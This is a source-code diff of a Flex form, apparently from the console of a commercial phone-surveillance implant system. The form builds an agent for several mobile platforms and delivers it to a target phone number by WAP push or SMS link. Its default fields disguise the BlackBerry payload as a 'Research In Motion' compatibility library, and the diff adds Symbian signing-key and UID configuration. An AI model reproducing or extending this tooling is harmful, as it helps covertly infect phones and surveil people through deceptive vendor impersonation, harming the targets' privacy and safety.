@@ -1,270 +1,495 @@
 <?xml version="1.0" encoding="utf-8"?>
-<s:Group xmlns:fx="http://ns.adobe.com/mxml/2009" 
-         xmlns:s="library://ns.adobe.com/flex/spark" 
-         xmlns:mx="library://ns.adobe.com/flex/mx" width="100%" height="100%" xmlns:build="it.ht.rcs.console.operations.view.agents.build.*">
-  
-  <fx:Script>
-    <![CDATA[
-      import it.ht.rcs.console.monitor.controller.LicenseManager;
-      import it.ht.rcs.console.network.controller.CollectorManager;
-      import it.ht.rcs.console.operations.view.agents.build.UploadPopup;
-      import it.ht.rcs.console.task.controller.DownloadManager;
-      import it.ht.rcs.console.utils.AlertPopUp;
-      
-      import locale.R;
-      
-      import mx.collections.ListCollectionView;
-      import mx.core.UIComponent;
-      import mx.events.ValidationResultEvent;
-      import mx.managers.PopUpManager;
-      import mx.rpc.events.FaultEvent;
-      import mx.rpc.events.ResultEvent;
-      
-      [Bindable]
-      private var urls:ListCollectionView;
-      
-      private var params:Object;
-      
-      private var platforms:Array;
-      
-      public function set platform(value:*):void {
-        if (value == 'blackberry' || value == 'symbian' || value == 'multiplatform')
-          currentState = value;
-        else
-          currentState = 'all';
-        
-        // get the list of entry points 
-        CollectorManager.instance.refresh();
-        urls = CollectorManager.instance.getEntryPointsView();
-        
-        if (value == null)
-          return;
-        
-        if (value == 'multiplatform')
-          platforms = ['blackberry', 'android', 'symbian', 'winmo'];
-        else          
-          platforms = [value];
-        
-        createBtn.platforms = platforms;
-          
-        // if rmi is in demo, override every platform
-        if (LicenseManager.instance.rmi_demo) {
-          createBtn.demo.enabled = false;
-          createBtn.demo.selected = true;
-        }
-        
-        // no RMI
-        if (!LicenseManager.instance.rmi_demo && !LicenseManager.instance.rmi) {
-          createBtn.enabled = false;
-          createBtn.demo.enabled = false;          
-        }
-        
-      }
-      
-      private var fileReference:FileReference;
-      
-      private function browse():void
-      {
-        params = {platform: 'symbian', binary: {demo: createBtn.demo.selected}, sign: {edition: 'symbian3'}, melt: {appname: appname.text} };
+<s:Group xmlns:fx="http://ns.adobe.com/mxml/2009"
+				 xmlns:s="library://ns.adobe.com/flex/spark"
+				 xmlns:mx="library://ns.adobe.com/flex/mx"
+				 width="100%"
+				 height="100%"
+				 xmlns:build="it.ht.rcs.console.operations.view.agents.build.*">
 
-        fileReference = new FileReference();
-        fileReference.addEventListener(Event.SELECT, uploadCert);
-        fileReference.browse();
-      }
-      
-      private var uploadPopup:UploadPopup;
-      private function uploadCert(event:Event):void
-      {
-        fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
-        fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
-        fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
-        fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onUploadComplete);
-        
-        uploadPopup = PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
-        uploadPopup.fileReference = fileReference;
-        PopUpManager.centerPopUp(uploadPopup);
-      }
-      
-      private function onUploadComplete(event:DataEvent):void
-      {
-        PopUpManager.removePopUp(uploadPopup);
-        
-        params['sign']['cert'] = event.data;
-      }
-      
-      private function onUploadError(event:Event):void
-      {
-        PopUpManager.removePopUp(uploadPopup);
-        AlertPopUp.show(event.type);
-      }
-      
-      private function collName(o:Object):String
-      {
-        if (o == null)
-          return 'invalid address';
-        
-        if (o.hasOwnProperty('address') && o['address'] != '')
-          return "http://" + o['address']  + '/';
-        
-        return o.toString();
-      }
-      
-      private function complete_with_slash(url:String):String
-      {
-        var ret:String = url;
-        
-        if (url.charAt(url.length-1) != '/')
-          ret += '/';
-        
-        return ret;
-      }
+	<fx:Script>
+		<![CDATA[
+			import it.ht.rcs.console.monitor.controller.LicenseManager;
+			import it.ht.rcs.console.network.controller.CollectorManager;
+			import it.ht.rcs.console.operations.view.agents.build.UploadPopup;
+			import it.ht.rcs.console.task.controller.DownloadManager;
+			import it.ht.rcs.console.utils.AlertPopUp;
+			import it.ht.rcs.console.build.controller.BuildManager;
+			import it.ht.rcs.console.build.model.SymbianConf;
 
-      
-      protected function send():void
-      {        
-        if (String(complete_with_slash(url.textInput.text) + appname.text + text.text).length>120) {
-          AlertPopUp.show(R.get('MESSAGE_TOO_LONG'), R.get('ERROR'));
-          return;
-        }
+			import locale.R;
 
-        if (number.text.length == 0 || number.text.charAt(0) != '+') {
-          AlertPopUp.show(R.get('MISSING_NUMBER'), R.get('ERROR'));
-          return;
-        }
+			import mx.collections.ListCollectionView;
+			import mx.core.UIComponent;
+			import mx.events.ValidationResultEvent;
+			import mx.managers.PopUpManager;
+			import mx.rpc.events.FaultEvent;
+			import mx.rpc.events.ResultEvent;
 
-        if (url.textInput.text.length == 0) {
-          AlertPopUp.show(R.get('MISSING_URL'), R.get('ERROR'));
-          return;
-        }
+			[Bindable]
+			private var urls:ListCollectionView;
 
-        if (appname.text.length == 0) {
-          AlertPopUp.show(R.get('MISSING_APPLICATION'), R.get('ERROR'));
-          return;
-        }
+			private var params:Object;
 
-        if (params != null)
-          params = {platform: 'wap', generate: {platforms: platforms, binary: {demo: createBtn.demo.selected}, sign: params['sign'], melt: {appname: appname.text}, 'package': {type: 'remote'}}, deliver: {} };
-        else
-          params = {platform: 'wap', generate: {platforms: platforms, binary: {demo: createBtn.demo.selected}, sign: {}, melt: {appname: appname.text}, 'package': {type: 'remote'}}, deliver: {} };
-        
-        
-        if (currentState == 'blackberry') {
-          params['generate']['melt']['name'] = nameForm.text;
-          params['generate']['melt']['desc'] = descForm.text
-          params['generate']['melt']['vendor'] = vendorForm.text;
-          params['generate']['melt']['version'] = versionForm.text;
-        }
-        
-        if (currentState == 'symbian') {
-          if(!params.sign)
-          {
-            AlertPopUp.show(R.get('MISSING_CERT'));
-            return;
-          }
-          
-          if(!params.sign.cert)
-          {
-            AlertPopUp.show(R.get('MISSING_CERT'));
-            return;
-          }
-          params['generate']['sign']['edition'] = edition.selectedItem;
-        }
+			private var platforms:Array;
 
-        if (currentState == 'multiplatform') {
-          params['generate']['platforms'] = ['blackberry', 'android', 'winmo'];
-        }
-        
-        params['deliver']['number'] = number.text;
-        params['deliver']['link'] = complete_with_slash(url.textInput.text) + appname.text;
-        
-        if (servindication.selected)
-          params['deliver']['type'] = 'si';
-        if (servloading.selected)
-          params['deliver']['type'] = 'sl';
-        if (sms.selected)
-          params['deliver']['type'] = 'sms';
-          
-        params['deliver']['text'] = text.text;
-        params['factory'] = {_id: parentDocument.factory._id};
-        
-        DownloadManager.instance.createTask("build", null, params, onSuccess, onFailure);
-      }
-      
-      private function onSuccess(e:ResultEvent):void
-      {
-        PopUpManager.removePopUp(((parentDocument as UIComponent).parentDocument).hostComponent);
-      }
-      
-      private function onFailure(e:FaultEvent):void
-      {
-        AlertPopUp.show(R.get('TASK_ALREADY_CREATED'));
-      }
-    ]]>
-  </fx:Script>
-  
-  <fx:Declarations>
-    <s:RadioButtonGroup id="Service"/>
-  </fx:Declarations>
-    
-  <s:states>
-    <s:State name='all'/>
-    <s:State name='multiplatform'/>
-    <s:State name='blackberry'/>
-    <s:State name='symbian'/>
-  </s:states>
-  
-  <s:Form left="10" top="10">
-    <s:FormItem label="{R.get('APPLICATION_NAME')}">    
-      <s:TextInput id="appname" text="installer"/>
-    </s:FormItem>
-    <s:FormItem label="{R.get('PHONE_NUMBER')}">    
-      <s:TextInput id="number" text="" restrict="0-9+"/>
-    </s:FormItem>
-    <s:FormItem label="URL">    
-      <s:ComboBox id="url" dataProvider="{urls}" labelFunction="collName" selectedIndex="0"/>
-    </s:FormItem>
-    <s:FormItem label="Service Type">    
-      <s:HGroup>
-        <s:RadioButton id="servloading" label="Loading" groupName="Service" selected="true"/>
-        <s:RadioButton id="servindication" label="Indication" groupName="Service"/>
-        <s:RadioButton id="sms" label="SMS" groupName="Service"/>
-      </s:HGroup>
-    </s:FormItem>
-    <s:FormItem label="{R.get('TEXT')}" enabled="{!servloading.selected}">    
-      <s:TextInput id="text" text="" width="180"/>
-    </s:FormItem>
-  </s:Form>
-  
-  <s:Form includeIn="blackberry" left="10" top="180">
-    <s:FormItem label="{R.get('NAME')}">    
-      <s:TextInput id="nameForm" text="RIM Compatibility Library" width="150"/>
-    </s:FormItem>
-    <s:FormItem label="{R.get('DESCRIPTION')}">        
-      <s:TextInput id="descForm" text="RIM Compatibility Library used by applications in the App World" width="210"/>
-    </s:FormItem>
-    <s:FormItem label="{R.get('VENDOR')}">       
-      <s:TextInput id="vendorForm" text="Research In Motion" width="150"/>
-    </s:FormItem>
-    <s:FormItem label="{R.get('VERSION')}">       
-      <s:TextInput id="versionForm" text="1.1.0" width="100"/>
-    </s:FormItem>
-  </s:Form>
-  
-  <s:Form includeIn="symbian" left="10" top="180">
-    <s:FormItem label="{R.get('SYMBIAN_CERT')}">    
-      <s:Button width="80" label="{R.get('BROWSE')}..." click="browse()"/>
-    </s:FormItem>
-    <s:FormItem label="S60 Edition">
-      <s:DropDownList id="edition" selectedIndex="0" width="80">
-        <mx:ArrayCollection>
-          <fx:String>5th3rd</fx:String>
-          <fx:String>5th</fx:String>
-          <fx:String>3rd</fx:String>
-        </mx:ArrayCollection>
-      </s:DropDownList>
-    </s:FormItem>
-  </s:Form>
-  
-  <build:CreateWithDemoButton id="createBtn" left="10" bottom="0" right="10" create="{send}"/>
-  
+			public function set platform(value:*):void
+			{
+				if (value == 'blackberry' || value == 'symbian' || value == 'multiplatform')
+					currentState=value;
+				else
+					currentState='all';
+
+				// get the list of entry points 
+				CollectorManager.instance.refresh();
+				urls=CollectorManager.instance.getEntryPointsView();
+
+				if (value == null)
+					return;
+
+				if (value == 'multiplatform')
+					platforms=['blackberry', 'android', 'symbian', 'winmo'];
+				else
+					platforms=[value];
+
+				createBtn.platforms=platforms;
+
+				if (value == 'symbian')
+				{
+					if (BuildManager.instance.symbianConf == null)
+						getSymbianConf()
+				}
+
+				// if rmi is in demo, override every platform
+				if (LicenseManager.instance.rmi_demo)
+				{
+					createBtn.demo.enabled=false;
+					createBtn.demo.selected=true;
+				}
+
+				// no RMI
+				if (!LicenseManager.instance.rmi_demo && !LicenseManager.instance.rmi)
+				{
+					createBtn.enabled=false;
+					createBtn.demo.enabled=false;
+				}
+
+			}
+
+			private var fileReference:FileReference;
+			private var keyReference:FileReference;
+
+			private function browse():void
+			{
+				params={platform: 'symbian', binary: {demo: createBtn.demo.selected}, sign: {edition: 'symbian3'}, melt: {appname: appname.text}};
+
+				fileReference=new FileReference();
+				fileReference.addEventListener(Event.SELECT, uploadCert);
+				fileReference.browse();
+			}
+
+			private function browseForKey():void
+			{
+
+				keyReference=new FileReference();
+				keyReference.addEventListener(Event.SELECT, onKeySelected);
+				keyReference.browse([new FileFilter("Key", "*.key")]);
+			}
+
+			private function onKeySelected(e:Event):void
+			{
+				keyTxt.text=keyReference.name;
+			}
+
+			private var uploadPopup:UploadPopup;
+
+			private function uploadCert(event:Event):void
+			{
+				fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
+				fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
+				fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
+				fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onUploadComplete);
+
+				uploadPopup=PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
+				uploadPopup.fileReference=fileReference;
+				PopUpManager.centerPopUp(uploadPopup);
+			}
+
+			private function setSymbianConf():void
+			{
+				//check form completion
+				if (uid1Txt.text == "" || uid1Txt.text.length < 8 || uid2Txt.text == "" || uid2Txt.text.length < 8 || uid3Txt.text == "" || uid3Txt.text.length < 8 || uid4Txt.text == "" || uid4Txt.text.length < 8 || uid5Txt.text == "" || uid5Txt.text.length < 8 || uid6Txt.text == "" || uid6Txt.text.length < 8)
+				{
+					AlertPopUp.show(R.get('MISSING_UIDS'));
+					return;
+				}
+				else if (!keyReference || keyReference.name == null || keyReference.name == "")
+				{
+					AlertPopUp.show(R.get('MISSING_KEY'));
+					return;
+				}
+				else
+				{
+					uploadKey()
+				}
+			}
+
+			private function uploadKey():void
+			{
+				keyReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
+				keyReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
+				keyReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
+				keyReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onKeyUploadComplete);
+
+				uploadPopup=PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
+				uploadPopup.fileReference=keyReference;
+				PopUpManager.centerPopUp(uploadPopup);
+			}
+
+			private function onKeyUploadComplete(event:DataEvent):void
+			{
+				var key:String=event.data;
+				var conf:Object=new Object();
+				conf.key=key;
+				conf.uids=[uid1Txt.text, uid2Txt.text, uid3Txt.text, uid4Txt.text, uid5Txt.text, uid6Txt.text]
+				BuildManager.instance.getSymbianConf(conf, onSymbianConfResult, onSymbianConfFault)
+				PopUpManager.removePopUp(uploadPopup);
+			}
+
+			private function onUploadComplete(event:DataEvent):void
+			{
+				PopUpManager.removePopUp(uploadPopup);
+
+				params['sign']['cert']=event.data;
+			}
+
+			private function onUploadError(event:Event):void
+			{
+				PopUpManager.removePopUp(uploadPopup);
+				AlertPopUp.show(event.type);
+			}
+
+			private function collName(o:Object):String
+			{
+				if (o == null)
+					return 'invalid address';
+
+				if (o.hasOwnProperty('address') && o['address'] != '')
+					return "http://" + o['address'] + '/';
+
+				return o.toString();
+			}
+
+			private function complete_with_slash(url:String):String
+			{
+				var ret:String=url;
+
+				if (url.charAt(url.length - 1) != '/')
+					ret+='/';
+
+				return ret;
+			}
+
+
+			protected function send():void
+			{
+				if (String(complete_with_slash(url.textInput.text) + appname.text + text.text).length > 120)
+				{
+					AlertPopUp.show(R.get('MESSAGE_TOO_LONG'), R.get('ERROR'));
+					return;
+				}
+
+				if (number.text.length == 0 || number.text.charAt(0) != '+')
+				{
+					AlertPopUp.show(R.get('MISSING_NUMBER'), R.get('ERROR'));
+					return;
+				}
+
+				if (url.textInput.text.length == 0)
+				{
+					AlertPopUp.show(R.get('MISSING_URL'), R.get('ERROR'));
+					return;
+				}
+
+				if (appname.text.length == 0)
+				{
+					AlertPopUp.show(R.get('MISSING_APPLICATION'), R.get('ERROR'));
+					return;
+				}
+
+				if (params != null)
+					params={platform: 'wap', generate: {platforms: platforms, binary: {demo: createBtn.demo.selected}, sign: params['sign'], melt: {appname: appname.text}, 'package': {type: 'remote'}}, deliver: {}};
+				else
+					params={platform: 'wap', generate: {platforms: platforms, binary: {demo: createBtn.demo.selected}, sign: {}, melt: {appname: appname.text}, 'package': {type: 'remote'}}, deliver: {}};
+
+
+				if (currentState == 'blackberry')
+				{
+					params['generate']['melt']['name']=nameForm.text;
+					params['generate']['melt']['desc']=descForm.text
+					params['generate']['melt']['vendor']=vendorForm.text;
+					params['generate']['melt']['version']=versionForm.text;
+				}
+
+				if (currentState == 'symbian')
+				{
+					if (!params.sign)
+					{
+						AlertPopUp.show(R.get('MISSING_CERT'));
+						return;
+					}
+
+					if (!params.sign.cert)
+					{
+						AlertPopUp.show(R.get('MISSING_CERT'));
+						return;
+					}
+					params['generate']['sign']['edition']=edition.selectedItem;
+				}
+
+				if (currentState == 'multiplatform')
+				{
+					params['generate']['platforms']=['blackberry', 'android', 'winmo'];
+				}
+
+				params['deliver']['number']=number.text;
+				params['deliver']['link']=complete_with_slash(url.textInput.text) + appname.text;
+
+				if (servindication.selected)
+					params['deliver']['type']='si';
+				if (servloading.selected)
+					params['deliver']['type']='sl';
+				if (sms.selected)
+					params['deliver']['type']='sms';
+
+				params['deliver']['text']=text.text;
+				params['factory']={_id: parentDocument.factory._id};
+
+				DownloadManager.instance.createTask("build", null, params, onSuccess, onFailure);
+			}
+
+			private function onSuccess(e:ResultEvent):void
+			{
+				PopUpManager.removePopUp(((parentDocument as UIComponent).parentDocument).hostComponent);
+			}
+
+			private function onFailure(e:FaultEvent):void
+			{
+				AlertPopUp.show(R.get('TASK_ALREADY_CREATED'));
+			}
+
+			public function getSymbianConf():void
+			{
+
+				BuildManager.instance.getSymbianConf(null, onSymbianConfResult, onSymbianConfFault)
+			}
+
+			private function onSymbianConfResult(e:ResultEvent):void
+			{
+				BuildManager.instance.symbianConf=e.result as SymbianConf;
+			}
+
+			private function onSymbianConfFault(e:FaultEvent):void
+			{
+				trace("symbian conf fault")
+			}
+		]]>
+	</fx:Script>
+
+	<fx:Declarations>
+		<s:RadioButtonGroup id="Service"/>
+	</fx:Declarations>
+
+	<s:states>
+		<s:State name='all'/>
+		<s:State name='multiplatform'/>
+		<s:State name='blackberry'/>
+		<s:State name='symbian'/>
+	</s:states>
+
+	<s:Form left="10"
+					top="10">
+		<s:FormItem label="{R.get('APPLICATION_NAME')}">
+			<s:TextInput id="appname"
+									 text="installer"/>
+		</s:FormItem>
+		<s:FormItem label="{R.get('PHONE_NUMBER')}">
+			<s:TextInput id="number"
+									 text=""
+									 restrict="0-9+"/>
+		</s:FormItem>
+		<s:FormItem label="URL">
+			<s:ComboBox id="url"
+									dataProvider="{urls}"
+									labelFunction="collName"
+									selectedIndex="0"/>
+		</s:FormItem>
+		<s:FormItem label="Service Type">
+			<s:HGroup>
+				<s:RadioButton id="servloading"
+											 label="Loading"
+											 groupName="Service"
+											 selected="true"/>
+				<s:RadioButton id="servindication"
+											 label="Indication"
+											 groupName="Service"/>
+				<s:RadioButton id="sms"
+											 label="SMS"
+											 groupName="Service"/>
+			</s:HGroup>
+		</s:FormItem>
+		<s:FormItem label="{R.get('TEXT')}"
+								enabled="{!servloading.selected}">
+			<s:TextInput id="text"
+									 text=""
+									 width="180"/>
+		</s:FormItem>
+	</s:Form>
+
+	<s:Form includeIn="blackberry"
+					left="10"
+					top="180">
+		<s:FormItem label="{R.get('NAME')}">
+			<s:TextInput id="nameForm"
+									 text="RIM Compatibility Library"
+									 width="150"/>
+		</s:FormItem>
+		<s:FormItem label="{R.get('DESCRIPTION')}">
+			<s:TextInput id="descForm"
+									 text="RIM Compatibility Library used by applications in the App World"
+									 width="210"/>
+		</s:FormItem>
+		<s:FormItem label="{R.get('VENDOR')}">
+			<s:TextInput id="vendorForm"
+									 text="Research In Motion"
+									 width="150"/>
+		</s:FormItem>
+		<s:FormItem label="{R.get('VERSION')}">
+			<s:TextInput id="versionForm"
+									 text="1.1.0"
+									 width="100"/>
+		</s:FormItem>
+	</s:Form>
+
+	<s:Form includeIn="symbian"
+					left="10"
+					top="180"
+					visible="{BuildManager.instance.symbianConf.key==true &amp;&amp; BuildManager.instance.symbianConf.uids.length==6}">
+		<s:FormItem label="{R.get('SYMBIAN_CERT')}">
+			<s:Button width="80"
+								label="{R.get('BROWSE')}..."
+								click="browse()"/>
+		</s:FormItem>
+		<s:FormItem label="S60 Edition">
+			<s:DropDownList id="edition"
+											selectedIndex="0"
+											width="80">
+				<mx:ArrayCollection>
+					<fx:String>5th3rd</fx:String>
+					<fx:String>5th</fx:String>
+					<fx:String>3rd</fx:String>
+				</mx:ArrayCollection>
+			</s:DropDownList>
+		</s:FormItem>
+	</s:Form>
+	<!-- Symbian configuration is OK-->
+
+	<s:VGroup includeIn="symbian"
+						left="10"
+						top="220"
+						visible="{BuildManager.instance.symbianConf.key==true &amp;&amp; BuildManager.instance.symbianConf.uids.length==6}"
+						includeInLayout="{BuildManager.instance.symbianConf.key==true &amp;&amp; BuildManager.instance.symbianConf.uids.length==6}">
+		<s:Spacer height="40"/>
+		<s:Label text="{R.get('SYMBIAN_CONF_OK')}"/>
+	</s:VGroup>
+
+	<!-- You have no Symbian configuration yet, please provide the data: -->
+
+	<s:VGroup includeIn="symbian"
+						left="10"
+						top="190"
+						visible="{BuildManager.instance.symbianConf.key!=true || BuildManager.instance.symbianConf.uids.length!=6}"
+						includeInLayout="{BuildManager.instance.symbianConf.key!=true || BuildManager.instance.symbianConf.uids.length!=6}">
+		<s:Label text="{R.get('SYMBIAN_CONF_MISSED')}"
+						 color="0xFF0000"
+						 fontWeight="bold"/>
+
+		<s:HGroup paddingTop="10">
+			<s:HGroup verticalAlign="middle">
+				<s:Label text="uid 1"
+								 fontWeight="bold"/>
+				<s:TextInput width="62"
+										 id="uid1Txt"
+										 restrict="A-Fa-f0-9"
+										 maxChars="8"/>
+			</s:HGroup>
+			<s:HGroup verticalAlign="middle">
+				<s:Label text="uid 2"
+								 fontWeight="bold"/>
+				<s:TextInput width="62"
+										 id="uid2Txt"
+										 restrict="A-Fa-f0-9"
+										 maxChars="8"/>
+			</s:HGroup>
+			<s:HGroup verticalAlign="middle">
+				<s:Label text="uid 3"
+								 fontWeight="bold"/>
+				<s:TextInput width="62"
+										 id="uid3Txt"
+										 restrict="A-Fa-f0-9"
+										 maxChars="8"/>
+			</s:HGroup>
+		</s:HGroup>
+
+		<s:HGroup>
+			<s:HGroup verticalAlign="middle">
+				<s:Label text="uid 4"
+								 fontWeight="bold"/>
+				<s:TextInput width="62"
+										 id="uid4Txt"
+										 restrict="A-Fa-f0-9"
+										 maxChars="8"/>
+			</s:HGroup>
+			<s:HGroup verticalAlign="middle">
+				<s:Label text="uid 5"
+								 fontWeight="bold"/>
+				<s:TextInput width="62"
+										 id="uid5Txt"
+										 restrict="A-Fa-f0-9"
+										 maxChars="8"/>
+			</s:HGroup>
+			<s:HGroup verticalAlign="middle">
+				<s:Label text="uid 6"
+								 fontWeight="bold"/>
+				<s:TextInput width="62"
+										 id="uid6Txt"
+										 restrict="A-Fa-f0-9"
+										 maxChars="8"/>
+			</s:HGroup>
+		</s:HGroup>
+		<s:HGroup verticalAlign="middle"
+							paddingTop="10">
+			<s:Label text="Key"
+							 fontWeight="bold"/>
+			<s:Button width="80"
+								label="{R.get('BROWSE')}..."
+								click="browseForKey()"/>
+			<s:Label id="keyTxt"
+							 text=""/>
+		</s:HGroup>
+	</s:VGroup>
+	<s:Button label="{R.get('CONFIGURATION_SET')}"
+						left="10"
+						bottom="0"
+						right="10"
+						visible="{BuildManager.instance.symbianConf.key!=true || BuildManager.instance.symbianConf.uids.length!=6}"
+						includeInLayout="{BuildManager.instance.symbianConf.key!=true || BuildManager.instance.symbianConf.uids.length!=6}"
+						click="setSymbianConf()"/>
+
+	<build:CreateWithDemoButton id="createBtn"
+															left="10"
+															bottom="0"
+															right="10"
+															create="{send}"
+															visible="{BuildManager.instance.symbianConf.key==true &amp;&amp; BuildManager.instance.symbianConf.uids.length==6}"/>
+
 </s:Group>
